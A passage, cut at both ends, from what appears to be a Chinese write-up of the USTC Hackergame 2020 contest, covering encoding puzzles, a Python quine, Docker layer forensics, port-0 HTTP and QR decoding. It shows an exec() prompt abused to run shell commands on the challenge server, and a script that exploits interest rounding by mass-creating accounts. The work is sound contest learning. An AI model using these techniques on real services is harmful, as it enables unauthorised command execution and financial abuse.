同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 